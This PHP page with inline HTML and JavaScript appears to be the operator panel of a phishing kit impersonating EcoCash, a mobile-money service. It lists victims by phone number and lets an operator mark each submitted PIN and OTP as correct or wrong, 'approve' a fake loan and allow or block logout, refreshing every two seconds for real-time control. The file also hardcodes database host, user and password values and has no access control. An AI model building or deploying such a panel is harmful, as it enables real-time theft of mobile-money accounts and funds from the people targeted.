<?php
session_start();

$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";

function getDbConnection($h,$p,$d,$u,$pw){ static $c=null; if(!$c){ $c=@pg_connect("host=$h port=$p dbname=$d user=$u password=$pw"); } return $c; }
$conn = getDbConnection($dbHost,$dbPort,$dbName,$dbUser,$dbPass);
if(!$conn) die("DB error");

// Add `created_at` column if missing (to track insertion order)
$checkCol = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
if(!$checkCol || pg_num_rows($checkCol)==0){
    pg_query($conn, "ALTER TABLE users ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
    // Also update existing rows with a default timestamp (optional)
    pg_query($conn, "UPDATE users SET created_at = NOW() WHERE created_at IS NULL");
}

// Ensure `approve` column exists
pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");

// Ensure `logout` column exists (default 0)
pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS logout INTEGER DEFAULT 0");

// Handle AJAX updates
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH'])=='xmlhttprequest'){
    header('Content-Type:application/json');
    $phone=$_POST['phone']; $type=$_POST['type']; $action=$_POST['action'];
    if(empty($phone)||empty($type)||empty($action)){
        echo json_encode(['success'=>false,'error'=>'Invalid params']); exit;
    }
    switch($type){
        case 'pin': $col='pin'; $val=($action=='correct')?1:0; break;
        case 'otp': $col='otp'; $val=($action=='correct')?1:0; break;
        case 'loan': $col='approve'; $val=($action=='approve')?1:0; break;
        case 'logout': $col='logout'; $val=($action=='allow')?1:0; break;
        default: echo json_encode(['success'=>false]); exit;
    }
    $r=pg_query_params($conn,"UPDATE users SET $col=$1 WHERE phone=$2",[$val,$phone]);
    echo json_encode(['success'=>(bool)$r]);
    exit;
}

// AJAX fetch data ordered by newest first (created_at DESC)
if(isset($_GET['fetch_data'])){
    header('Content-Type:application/json');
    $sql="SELECT phone, pin, otp, approve, logout, created_at FROM users ORDER BY created_at DESC";
    $res=pg_query($conn,$sql);
    $rows=[];
    while($row=pg_fetch_assoc($res)){
        $rows[]=[
            'phone'=>$row['phone'],
            'pin_status'=>(int)$row['pin'],
            'otp_status'=>(int)$row['otp'],
            'loan_approve'=>(int)$row['approve'],
            'logout_status'=>(int)$row['logout'],
            'created_at'=>$row['created_at']
        ];
    }
    echo json_encode($rows);
    exit;
}

// Initial load (same query)
$sql="SELECT phone, pin, otp, approve, logout, created_at FROM users ORDER BY created_at DESC";
$res=pg_query($conn,$sql);
$records=[];
while($row=pg_fetch_assoc($res)){
    $records[]=[
        'phone'=>$row['phone'],
        'pin_status'=>(int)$row['pin'],
        'otp_status'=>(int)$row['otp'],
        'loan_approve'=>(int)$row['approve'],
        'logout_status'=>(int)$row['logout']
    ];
}
$totalRecords = count($records);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>EcoCash Admin | Users (Newest First)</title>
    <style>
        *{box-sizing:border-box;}
        body{font-family:'Segoe UI',sans-serif;background:#f0f2f5;margin:0;padding:16px;}
        .container{max-width:1300px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 4px 12px rgba(0,0,0,0.1);overflow:hidden;}
        h1{background:#0a5fa7;color:#fff;margin:0;padding:18px 20px;font-size:1.5rem;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:12px;}
        .refresh-indicator{font-size:0.75rem;background:rgba(255,255,255,0.2);padding:4px 12px;border-radius:30px;}
        .table-wrapper{overflow-x:auto;padding:16px 20px;}
        table{width:100%;border-collapse:collapse;font-size:0.9rem;min-width:650px;}
        th,td{padding:12px 12px;text-align:left;border-bottom:1px solid #e0e0e0;}
        th{background-color:#f8f9fa;font-weight:600;}
        tr:hover{background-color:#f5f7fa;}
        .badge{display:inline-block;padding:4px 12px;border-radius:30px;font-size:0.75rem;font-weight:600;}
        .badge-success{background-color:#d4edda;color:#155724;}
        .badge-warning{background-color:#fff3cd;color:#856404;}
        .badge-approved{background-color:#cce5ff;color:#004085;}
        .badge-logout{background-color:#f8d7da;color:#721c24;}
        .btn-group{display:flex;flex-wrap:wrap;gap:8px;}
        .btn{border:none;padding:6px 14px;border-radius:8px;font-size:0.75rem;font-weight:500;cursor:pointer;white-space:nowrap;}
        .btn-pin{background-color:#1d4ed8;color:#fff;}
        .btn-pin:hover{background-color:#1e40af;}
        .btn-otp{background-color:#10b981;color:#fff;}
        .btn-otp:hover{background-color:#059669;}
        .btn-loan{background-color:#f59e0b;color:#fff;}
        .btn-loan:hover{background-color:#d97706;}
        .btn-logout{background-color:#dc2626;color:#fff;}
        .btn-logout:hover{background-color:#b91c1c;}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;z-index:1000;padding:16px;}
        .modal-content{background:#fff;border-radius:20px;width:100%;max-width:340px;padding:24px 20px;text-align:center;box-shadow:0 20px 30px rgba(0,0,0,0.2);}
        .modal-content p{margin:0 0 20px;font-size:1.2rem;font-weight:500;}
        .modal-buttons{display:flex;flex-direction:column;gap:12px;}
        .modal-buttons button{padding:12px;border:none;border-radius:50px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;}
        .btn-correct,.btn-approve{background-color:#10b981;color:#fff;}
        .btn-wrong,.btn-default{background-color:#ef4444;color:#fff;}
        .btn-allow{background-color:#10b981;color:#fff;}
        .btn-block{background-color:#ef4444;color:#fff;}
        footer{padding:14px 20px;background:#f8f9fa;font-size:0.7rem;color:#6c757d;text-align:center;border-top:1px solid #e0e0e0;}
        @media(max-width:700px){body{padding:10px;}h1{font-size:1.2rem;padding:14px 16px;}th,td{padding:8px 8px;font-size:0.8rem;}.btn{padding:5px 10px;font-size:0.7rem;}.badge{font-size:0.7rem;padding:3px 8px;}}
        @media(max-width:550px){.table-wrapper{padding:12px;}.btn-group{flex-direction:column;gap:6px;}.btn{text-align:center;}}
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 EcoCash Admin – Users (Newest First) <span class="refresh-indicator">Auto-refresh 2s</span></h1>
    <div class="table-wrapper">
        <table id="dataTable">
            <thead>
                <tr><th>#</th><th>Phone</th><th>PIN</th><th>OTP</th><th>Loan</th><th>Logout</th><th>Actions</th></tr>
            </thead>
            <tbody id="tableBody"><tr><td colspan="7">Loading...</td></tr></tbody>
        </table>
    </div>
    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>Click a button → On (1) / Off (0). Logout: Allow (1) / Block (0).</footer>
</div>
<div id="verifyModal" class="modal"><div class="modal-content"><p id="modalMessage"></p><div class="modal-buttons" id="modalButtons"></div></div></div>
<script>
let pendingPhone=null,pendingType=null;
const modal=document.getElementById('verifyModal');
const modalMessage=document.getElementById('modalMessage');
const modalButtons=document.getElementById('modalButtons');
const tableBody=document.getElementById('tableBody');
let totalRows=0;

function renderTable(records){
    totalRows=records.length;
    if(!totalRows){ tableBody.innerHTML='<tr><td colspan="7">No records found.</td></tr>'; return; }
    let html='';
    records.forEach((rec,idx)=>{
        const rowNumber = totalRows - idx; // newest gets highest number
        const phone=escapeHtml(rec.phone);
        const pinStatus=rec.pin_status;
        const otpStatus=rec.otp_status;
        const loanApprove=rec.loan_approve;
        const logoutStatus=rec.logout_status;
        html+=`<tr data-phone="${phone}">`;
        html+=`<td style="text-align:center; font-weight:bold;">${rowNumber}</td>`;
        html+=`<td>+263 ${phone}</td>`;
        html+=`<td><span class="badge ${pinStatus?'badge-success':'badge-warning'}">${pinStatus?'On (1)':'Off (0)'}</span></td>`;
        html+=`<td><span class="badge ${otpStatus?'badge-success':'badge-warning'}">${otpStatus?'On (1)':'Off (0)'}</span></td>`;
        html+=`<td><span class="badge ${loanApprove?'badge-approved':'badge-warning'}">${loanApprove?'Approved (1)':'Default (0)'}</span></td>`;
        html+=`<td><span class="badge ${logoutStatus?'badge-logout':'badge-warning'}">${logoutStatus?'Allowed (1)':'Blocked (0)'}</span></td>`;
        html+=`<td class="btn-group">
            <button class="btn btn-pin verify-pin" data-phone="${phone}">🔐 PIN</button>
            <button class="btn btn-otp verify-otp" data-phone="${phone}">📱 OTP</button>
            <button class="btn btn-loan verify-loan" data-phone="${phone}">🏦 Loan</button>
            <button class="btn btn-logout verify-logout" data-phone="${phone}">🚪 Logout</button>
        </td></tr>`;
    });
    tableBody.innerHTML=html;
    attachEvents();
}
function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'&lt;':m=='>'?'&gt;':m); }
function attachEvents(){
    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
    document.querySelectorAll('.verify-otp').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'otp',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
    document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
    document.querySelectorAll('.verify-logout').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'logout',[{label:'✅ Allow (1)',action:'allow',class:'btn-allow'},{label:'❌ Block (0)',action:'block',class:'btn-block'}]); });
}
function showModal(phone,type,options){
    pendingPhone=phone; pendingType=type;
    let typeLabel = type==='pin'?'PIN':type==='otp'?'OTP':type==='loan'?'Loan':'Logout';
    modalMessage.innerText=`${typeLabel} for ${phone}:`;
    modalButtons.innerHTML='';
    options.forEach(opt=>{
        let btn=document.createElement('button');
        btn.textContent=opt.label; btn.className=opt.class;
        btn.onclick=()=>{ updateStatus(pendingPhone,pendingType,opt.action); closeModal(); };
        modalButtons.appendChild(btn);
    });
    modal.style.display='flex';
}
function closeModal(){ modal.style.display='none'; pendingPhone=pendingType=null; }
async function updateStatus(phone,type,action){
    let fd=new FormData(); fd.append('phone',phone); fd.append('type',type); fd.append('action',action);
    try{
        let res=await fetch(window.location.href,{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'},body:fd});
        let data=await res.json();
        if(data.success) await fetchData();
        else alert('Error: '+ (data.error||'Update failed'));
    }catch(e){ alert('Network error'); }
    closeModal();
}
async function fetchData(){
    try{
        let res=await fetch(window.location.href+'?fetch_data=1');
        let records=await res.json();
        renderTable(records);
    }catch(e){ console.error(e); }
}
window.onclick=e=>{ if(e.target===modal) closeModal(); };
fetchData();
setInterval(fetchData,2000);
</script>
</body>
</html>
